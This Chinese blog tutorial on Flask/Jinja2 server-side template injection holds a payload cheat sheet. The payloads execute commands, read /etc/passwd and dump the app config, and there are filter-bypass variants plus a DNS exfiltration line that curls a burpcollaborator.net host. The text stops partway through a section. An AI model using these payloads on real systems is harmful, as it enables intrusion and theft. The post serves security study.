@@ -1,0 +1,1314 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>SSTI 相关</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/ssti/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='SSTI 相关'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/ssti/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/ssti/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="SSTI 相关">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/ssti/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/ssti/">
+                <img src="/p/ssti/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/ssti/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/ssti/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post SSTI 相关" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%B8%B8%E7%94%A8/" style="background-color: #2a9d8f; color: #fff;">
+                常用
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/ssti/">SSTI 相关</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="ssti相关">SSTI相关</h1>
+<h2 id="模板">模板</h2>
+<p>用于Web应用的模板引擎主要是为了让界面与数据分离。前端专门设计特定格式和风格的HTML模板(界面)，可根据用户输入内容进行填充(数据)，通过模板引擎生成HTML代码，响应给客户端以灵活展示。</p>
+<p><code>Flask</code>是一个用Python编写的轻量级Web应用程序框架，其使用<code>jinja2</code>作为模板引擎。<code>jinja2</code>基本语法有如下：</p>
+<pre tabindex="0"><code>{{`%` `%`}} # 语句
+
+{{...}} # 表达式
+
+{{#...#}} # 注释
+</code></pre><h2 id="基本原理">基本原理</h2>
+<p><code>SSTL</code>(服务端模板注入)的本质在于接收用户任意的输入并执行，造成服务端<strong>信息泄露、代码执行</strong>等问题。</p>
+<p>例如jinja2模板中使用 <code>{{}}</code> 语法表示一个变量值，是一种特殊的占位符，当利用 jinja2 进行渲染的时候，它会执行所接收到的内容并把这些特殊的占位符进行替换。</p>
+<h2 id="flask模板注入">flask模板注入</h2>
+<h3 id="搭建环境">搭建环境</h3>
+<p>安装flask：</p>
+<pre tabindex="0"><code>pip3 install flask
+</code></pre><p>服务端：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span>
+ 
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+ 
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s2">&#34;Hello </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">name</span><span class="p">)</span>
+ 
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</code></pre></div><blockquote>
+<p><code>@app.route(&quot;/&quot;)</code>是route装饰器路由的使用，其将一个函数绑定至相应的URL上，当访问该URL时触发该函数。</p>
+<p>例如访问目标应用根路径，并传入name参数：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 437; 
+			flex-basis: 1049px"
+	>
+	<a href="/p/ssti/image-20220128144703206.png" data-size="516x118">
+		<img src="/p/ssti/image-20220128144703206.png"
+			width="516"
+			height="118"
+			srcset="/p/ssti/image-20220128144703206_hudf9ef00cfb153aaa5765b5da9047ae81_7824_480x0_resize_box_3.png 480w, /p/ssti/image-20220128144703206_hudf9ef00cfb153aaa5765b5da9047ae81_7824_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</blockquote>
+<h3 id="基础">基础</h3>
+<p>python中object类是所有类的基类，当定义一个类没有指定继承哪个类，则默认继承object类。</p>
+<h4 id="内建属性和方法的使用">内建属性和方法的使用</h4>
+<blockquote>
+<p><code>__calss__</code>表示当前类：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 578; 
+			flex-basis: 1389px"
+	>
+	<a href="/p/ssti/image-20220128153758045.png" data-size="220x38">
+		<img src="/p/ssti/image-20220128153758045.png"
+			width="220"
+			height="38"
+			srcset="/p/ssti/image-20220128153758045_hud95eab409004063d250ce65cec08073b_3106_480x0_resize_box_3.png 480w, /p/ssti/image-20220128153758045_hud95eab409004063d250ce65cec08073b_3106_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</blockquote>
+<blockquote>
+<p><code>__base__</code>列出当前类的直接父类：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 837; 
+			flex-basis: 2009px"
+	>
+	<a href="/p/ssti/image-20220128153925267.png" data-size="293x35">
+		<img src="/p/ssti/image-20220128153925267.png"
+			width="293"
+			height="35"
+			srcset="/p/ssti/image-20220128153925267_hufde5d002e5f37d251513c94fa0b63956_4294_480x0_resize_box_3.png 480w, /p/ssti/image-20220128153925267_hufde5d002e5f37d251513c94fa0b63956_4294_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</blockquote>
+<blockquote>
+<p><code>__bases__</code>以元组形式列出当前类的所有直接父类：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 882; 
+			flex-basis: 2118px"
+	>
+	<a href="/p/ssti/image-20220128161331984.png" data-size="309x35">
+		<img src="/p/ssti/image-20220128161331984.png"
+			width="309"
+			height="35"
+			srcset="/p/ssti/image-20220128161331984_hu116efdfcb75b9ecd44f10ec09ac9ae8e_4599_480x0_resize_box_3.png 480w, /p/ssti/image-20220128161331984_hu116efdfcb75b9ecd44f10ec09ac9ae8e_4599_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</blockquote>
+<blockquote>
+<p><code>__mro__</code>列出当前类的调用顺序，按照子类、父类、父类的父类顺序返回：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 827; 
+			flex-basis: 1984px"
+	>
+	<a href="/p/ssti/image-20220128161534721.png" data-size="306x37">
+		<img src="/p/ssti/image-20220128161534721.png"
+			width="306"
+			height="37"
+			srcset="/p/ssti/image-20220128161534721_hu65a41effaddf471d83b3b033f5012877_4309_480x0_resize_box_3.png 480w, /p/ssti/image-20220128161534721_hu65a41effaddf471d83b3b033f5012877_4309_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</blockquote>
+<blockquote>
+<p><code>__subclasses__()</code>当获取到object类之后，可以用该方法获取所有子类：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 372; 
+			flex-basis: 893px"
+	>
+	<a href="/p/ssti/image-20220128161810392.png" data-size="577x155">
+		<img src="/p/ssti/image-20220128161810392.png"
+			width="577"
+			height="155"
+			srcset="/p/ssti/image-20220128161810392_huff9a712649d6033d34652bd631615bf5_31195_480x0_resize_box_3.png 480w, /p/ssti/image-20220128161810392_huff9a712649d6033d34652bd631615bf5_31195_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</blockquote>
+<blockquote>
+<p><code>__init__</code>初始化类，只有初始化后才能使用其方法和属性。</p>
+</blockquote>
+<blockquote>
+<p><code>__globals__</code>以字典类型返回当前位置的全部模块、方法和全局变量。</p>
+<p>如果被过滤，可以使用以下等效：</p>
+<pre tabindex="0"><code>__init__.__globals__['sys']
+__init__.__getattribute__('__global'+'s__')['sys']
+</code></pre></blockquote>
+<blockquote>
+<p><code>__dict__</code>列出属于当前模块的方法和属性，dir()与其作用类似，但是dir()也会显示从父类继承来的属性。一般用在某些方法被过滤了的情况。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 858; 
+			flex-basis: 2060px"
+	>
+	<a href="/p/ssti/image-20220128165707628.png" data-size="352x41">
+		<img src="/p/ssti/image-20220128165707628.png"
+			width="352"
+			height="41"
+			srcset="/p/ssti/image-20220128165707628_huf77929c28e37fd7312df4df86a951925_4298_480x0_resize_box_3.png 480w, /p/ssti/image-20220128165707628_huf77929c28e37fd7312df4df86a951925_4298_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</blockquote>
+<blockquote>
+<p><code>__builtins__</code>的使用：</p>
+<pre tabindex="0"><code>__builtins__.__dict__['__import__']('os').system('whoami')
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1614; 
+			flex-basis: 3874px"
+	>
+	<a href="/p/ssti/image-20220128165828629.png" data-size="565x35">
+		<img src="/p/ssti/image-20220128165828629.png"
+			width="565"
+			height="35"
+			srcset="/p/ssti/image-20220128165828629_huf075ec27a7a6eda5f5ef567faccde9e2_5371_480x0_resize_box_3.png 480w, /p/ssti/image-20220128165828629_huf075ec27a7a6eda5f5ef567faccde9e2_5371_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</blockquote>
+<h4 id="过滤器的使用">过滤器的使用</h4>
+<ul>
+<li>attr</li>
+</ul>
+<pre tabindex="0"><code>&quot;&quot;|attr(&quot;__class__&quot;)
+# 等效于 &quot;&quot;.__calss__
+# 常用于点.、中括号[]被过滤
+</code></pre><ul>
+<li>format</li>
+</ul>
+<pre tabindex="0"><code>&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)
+# 等效于'__class__'
+
+&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]
+# 等效于&quot;&quot;[&quot;__class__&quot;]
+</code></pre><ul>
+<li>join(将接收到的内容进行拼接返回)</li>
+</ul>
+<pre tabindex="0"><code>&quot;&quot;[['__clas','s__']|join] 或者 &quot;&quot;[('__clas','s__')|join]
+# 等效于&quot;&quot;[&quot;__class__&quot;]
+</code></pre><ul>
+<li>lower</li>
+</ul>
+<pre tabindex="0"><code>&quot;&quot;[&quot;__CLASS__&quot;|lower]
+</code></pre><ul>
+<li>replace</li>
+</ul>
+<pre tabindex="0"><code>&quot;__clase__&quot;|replace(&quot;e&quot;,&quot;s&quot;)&quot;
+</code></pre><ul>
+<li>reverse</li>
+</ul>
+<pre tabindex="0"><code>&quot;__ssalc__&quot;|reverse
+# 等效于&quot;__class__&quot;
+</code></pre><ul>
+<li>string(将接收到的内容转为字符串)</li>
+</ul>
+<pre tabindex="0"><code>&quot;&quot;.__class__的结果是 &lt;class 'str'&gt;
+(&quot;&quot;.__class__|string)[0]
+# 得到字符'&lt;'
+</code></pre><h3 id="寻找注入点">寻找注入点</h3>
+<p>Flask模板注入的关键点就在于<code>{{}}</code>，所以通常是在多个位置输入{{3*3}}来判断是否会执行并回显。</p>
+<p>一般的判断模板的方法：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 170; 
+			flex-basis: 408px"
+	>
+	<a href="/p/ssti/image-20220128173131431.png" data-size="993x583">
+		<img src="/p/ssti/image-20220128173131431.png"
+			width="993"
+			height="583"
+			srcset="/p/ssti/image-20220128173131431_hudb4c8723eecf0b6b90cbb2d1417c6835_83117_480x0_resize_box_3.png 480w, /p/ssti/image-20220128173131431_hudb4c8723eecf0b6b90cbb2d1417c6835_83117_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="基本漏洞利用">基本漏洞利用</h3>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 535; 
+			flex-basis: 1284px"
+	>
+	<a href="/p/ssti/image-20220128174040210.png" data-size="535x100">
+		<img src="/p/ssti/image-20220128174040210.png"
+			width="535"
+			height="100"
+			srcset="/p/ssti/image-20220128174040210_hu491d1823da7dee4e37e51a0cbdf33f04_8059_480x0_resize_box_3.png 480w, /p/ssti/image-20220128174040210_hu491d1823da7dee4e37e51a0cbdf33f04_8059_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>获取object类</li>
+</ul>
+<pre tabindex="0"><code>{{&quot;&quot;.__class__.__base__}}
+
+{{&quot;&quot;.__class__.__bases__[0]}}
+
+{{&quot;&quot;.__class__.__mro__[-1]}}
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 736; 
+			flex-basis: 1768px"
+	>
+	<a href="/p/ssti/image-20220128174614633.png" data-size="663x90">
+		<img src="/p/ssti/image-20220128174614633.png"
+			width="663"
+			height="90"
+			srcset="/p/ssti/image-20220128174614633_huf818b82b17f8aa581e04c6d668c9ed82_10827_480x0_resize_box_3.png 480w, /p/ssti/image-20220128174614633_huf818b82b17f8aa581e04c6d668c9ed82_10827_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>获取所有子类</li>
+</ul>
+<pre tabindex="0"><code>{{&quot;&quot;.__class__.__mro__[-1].__subclasses__()}}
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 266; 
+			flex-basis: 639px"
+	>
+	<a href="/p/ssti/image-20220128174712153.png" data-size="866x325">
+		<img src="/p/ssti/image-20220128174712153.png"
+			width="866"
+			height="325"
+			srcset="/p/ssti/image-20220128174712153_hub835e28e625a5cb7c28684a4f577008f_92045_480x0_resize_box_3.png 480w, /p/ssti/image-20220128174712153_hub835e28e625a5cb7c28684a4f577008f_92045_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>在获取到的子类中寻找一些可用的类和方法</li>
+</ul>
+<p>以寻找可执行系统命令的方法为目的，例如<code>popen</code>方法。</p>
+<p><strong>本地寻找：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;popen&#39;</span>
+<span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">cur</span> <span class="ow">in</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">target</span> <span class="ow">in</span> <span class="n">cur</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">cur</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+    <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>
+</code></pre></div><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1032; 
+			flex-basis: 2476px"
+	>
+	<a href="/p/ssti/image-20220129103807758.png" data-size="258x25">
+		<img src="/p/ssti/image-20220129103807758.png"
+			width="258"
+			height="25"
+			srcset="/p/ssti/image-20220129103807758_hu3a773e194473ab8c9e846665f5648f48_3502_480x0_resize_box_3.png 480w, /p/ssti/image-20220129103807758_hu3a773e194473ab8c9e846665f5648f48_3502_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>结果表明：<code>object</code>基类的第133个子类有<code>popen</code>方法，因此可以初始化该类，并以<code>__globals__</code>获取方法和属性等，并利用。</p>
+<ul>
+<li>利用</li>
+</ul>
+<pre tabindex="0"><code>{{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__['popen']('whoami').read()}}
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1006; 
+			flex-basis: 2415px"
+	>
+	<a href="/p/ssti/image-20220129105647059.png" data-size="1117x111">
+		<img src="/p/ssti/image-20220129105647059.png"
+			width="1117"
+			height="111"
+			srcset="/p/ssti/image-20220129105647059_huebd5a3e1a84d9d740bd547601fb11cca_15058_480x0_resize_box_3.png 480w, /p/ssti/image-20220129105647059_huebd5a3e1a84d9d740bd547601fb11cca_15058_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220129105647059">
+	</a>
+	
+	<figcaption>image-20220129105647059</figcaption>
+	
+</figure></p>
+<p><strong>打印类编号，用于寻找：</strong></p>
+<pre tabindex="0"><code>{%for i in range(300)%}
+{{().__class__.__mro__[-1].__subclasses__()[i]}}
+{{i}}
+{%endfor%}
+</code></pre><h4 id="一般可利用的类和函数">一般可利用的类和函数</h4>
+<blockquote>
+<p>针对不同版本有些类的序号需要手动去找</p>
+</blockquote>
+<ul>
+<li>config</li>
+</ul>
+<p>使用{{config}}查询配置信息</p>
+<ul>
+<li>popen</li>
+</ul>
+<p>用于执行系统命令，使用read()方法读取结果</p>
+<ul>
+<li>subprocess.Popen</li>
+</ul>
+<p>用于执行系统命令</p>
+<pre tabindex="0"><code>{{&quot;&quot;.__class__.__base__.__subclasses__()[213]('whoami',shell=True,stdout=-1).communicate()[0].strip().decode()}}
+</code></pre><ul>
+<li><code>__import__</code> (动态加载类和函数)os</li>
+</ul>
+<p>导入os模块执行系统命令</p>
+<pre tabindex="0"><code>{{&quot;&quot;.__class__.__base__.__subclasses__()[80].__init__.__globals__.__import__('os').popen('whoami').read()}}
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 888; 
+			flex-basis: 2133px"
+	>
+	<a href="/p/ssti/image-20220129111643936.png" data-size="800x90">
+		<img src="/p/ssti/image-20220129111643936.png"
+			width="800"
+			height="90"
+			srcset="/p/ssti/image-20220129111643936_hu963cb83fd91e6306a6933a5a4eb01dcf_14433_480x0_resize_box_3.png 480w, /p/ssti/image-20220129111643936_hu963cb83fd91e6306a6933a5a4eb01dcf_14433_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220129111643936">
+	</a>
+	
+	<figcaption>image-20220129111643936</figcaption>
+	
+</figure></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1398; 
+			flex-basis: 3357px"
+	>
+	<a href="/p/ssti/image-20220129112318835.png" data-size="1217x87">
+		<img src="/p/ssti/image-20220129112318835.png"
+			width="1217"
+			height="87"
+			srcset="/p/ssti/image-20220129112318835_hudc1b857720f9606534075278fd25ecd0_15686_480x0_resize_box_3.png 480w, /p/ssti/image-20220129112318835_hudc1b857720f9606534075278fd25ecd0_15686_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220129112318835">
+	</a>
+	
+	<figcaption>image-20220129112318835</figcaption>
+	
+</figure></p>
+<ul>
+<li><code>__builtins__</code>执行代码</li>
+</ul>
+<pre tabindex="0"><code>{{().__class__.__base__.__subclasses__()[200].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('whoami').read()&quot;)}}
+
+{{().__class__.__base__.__subclasses__()[200].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}
+
+{{().__class__.__base__.__subclasses__()[200].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
+</code></pre><ul>
+<li>request(jinja2中存在request对象)</li>
+</ul>
+<pre tabindex="0"><code>{request.__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}
+
+{{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}
+</code></pre><ul>
+<li><code>url_for、get_flashed_messages、lipsum</code>(这三个都是函数，可直接调os或使用<code>__builtins__</code>)</li>
+</ul>
+<pre tabindex="0"><code>{{url_for.__globals__['os'].popen('whoami').read()}}
+
+# 读配置
+{{url_for.__globals__['current_app'].config}}
+
+{{url_for.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('whoami').read()&quot;)}}
+</code></pre><ul>
+<li>FileLoader读取文件</li>
+</ul>
+<pre tabindex="0"><code>{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[99][&quot;get_data&quot;](0, &quot;/etc/passwd&quot;)}}
+</code></pre><h3 id="绕过方法">绕过方法</h3>
+<h4 id="过滤">过滤<code>.</code></h4>
+<pre tabindex="0"><code>{{&quot;&quot;.__class__}}
+
+{{&quot;&quot;['__class__']}}
+{{&quot;&quot;|attr(&quot;__class__&quot;)}
+</code></pre><h4 id="过滤引号">过滤引号</h4>
+<ul>
+<li>request绕过</li>
+</ul>
+<pre tabindex="0"><code># GET
+{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__.__builtins__[request.args.a1](request.args.a2).read()}}&amp;a1=open&amp;a2=/etc/passwd
+
+# POST
+{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__.__builtins__[request.values.a1](request.values.a2).read()}}
+
+POST中的数据：a1=open&amp;a2=/etc/passwd
+
+# Cookie
+{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__.__builtins__[request.cookies.a1](request.cookies.a2).read()}}
+
+Cookie中的数据：a1=open;a2=/etc/passwd
+</code></pre><ul>
+<li>使用chr()函数绕过</li>
+</ul>
+<pre tabindex="0"><code># 先暴破找出chr函数
+{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[暴破点].__init__.__globals__.__builtins__.chr}}
+
+# 原利用payload
+{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('whoami').read()}}
+
+# 用chr()代替引号
+{%set chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%}{{[].__class__.__base__.__subclasses__()[133].__init__.__globals__[chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()}}
+</code></pre><h4 id="过滤-1">过滤<code>()</code></h4>
+<p>只能config看看配置信息</p>
+<h4 id="过滤_">过滤<code>_</code></h4>
+<ul>
+<li>十六进制绕过</li>
+</ul>
+<pre tabindex="0"><code>{{&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[133][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;]['popen']('whoami')['read']()}}
+</code></pre><blockquote>
+<p>引号中的关键字也可以十六进制编码</p>
+</blockquote>
+<ul>
+<li>Unicode编码绕过</li>
+</ul>
+<pre tabindex="0"><code>{{&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)}}
+</code></pre><h4 id="过滤各类关键字">过滤各类关键字</h4>
+<ul>
+<li>拼接</li>
+</ul>
+<pre tabindex="0"><code>{{&quot;&quot;['__cla'+'ss__'].__bases__[0]}}
+{{&quot;&quot;['__cla''ss__'].__bases__[0]}}
+
+{{&quot;&quot;|attr([&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2]|join)}}
+</code></pre><ul>
+<li>格式化</li>
+</ul>
+<pre tabindex="0"><code>{{&quot;&quot;|attr(request.args.a1|format(request.args.a2))}}&amp;a1=__c%sass__&amp;a2=l
+</code></pre><ul>
+<li>过滤<code>__init__</code>，使用<code>__enter__</code>和<code>__exit__</code>替代</li>
+<li>过滤<code>config</code></li>
+</ul>
+<pre tabindex="0"><code>{{self}} ⇒ &lt;TemplateReference None&gt;
+{{self.__dict__._TemplateReference__context}}
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 394; 
+			flex-basis: 946px"
+	>
+	<a href="/p/ssti/image-20220204104023156.png" data-size="1002x254">
+		<img src="/p/ssti/image-20220204104023156.png"
+			width="1002"
+			height="254"
+			srcset="/p/ssti/image-20220204104023156_hu116b080ecd5de20aa391bbc3ac09782f_84493_480x0_resize_box_3.png 480w, /p/ssti/image-20220204104023156_hu116b080ecd5de20aa391bbc3ac09782f_84493_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220204104023156">
+	</a>
+	
+	<figcaption>image-20220204104023156</figcaption>
+	
+</figure></p>
+<h4 id="过滤-2">过滤<code>{}</code></h4>
+<ul>
+<li>DNS外带</li>
+</ul>
+<pre tabindex="0"><code>{% if &quot;&quot;.__class__.__base__.__subclasses__()[133].__init__.__globals__['popen'](&quot;curl `whoami`.mj9rk9hp8fslvlnxrgsh86yksby1mq.burpcollaborator.net&quot;).read()=='ssti' %}1{% endif %}
+</code></pre><ul>
+<li>print</li>
+</ul>
+<pre tabindex="0"><code>{%print &quot;&quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('whoami').read()&quot;)%}
+</code></pre><h4 id="过滤-3">过滤<code>[]</code></h4>
+<ul>
+<li>索引中的<code>[]</code>，使用<code>pop()、__getitem__()</code></li>
+</ul>
+<pre tabindex="0"><code>{{().__class__.__base__.__subclasses__().__getitem__(133).__init__.__globals__.popen('whoami').read()}}
+ 
+{{().__class__.__base__.__subclasses__().pop(133).__init__.__globals__.popen('whoami').read()}}
+</code></pre><ul>
+<li>当绕过关键字限制使用<code>[]</code>时</li>
+</ul>
+<pre tabindex="0"><code>{{&quot;&quot;.__getattribute__(&quot;__cla&quot;+&quot;ss__&quot;).__base__}}
+</code></pre><h4 id="过滤数字">过滤数字</h4>
+<ul>
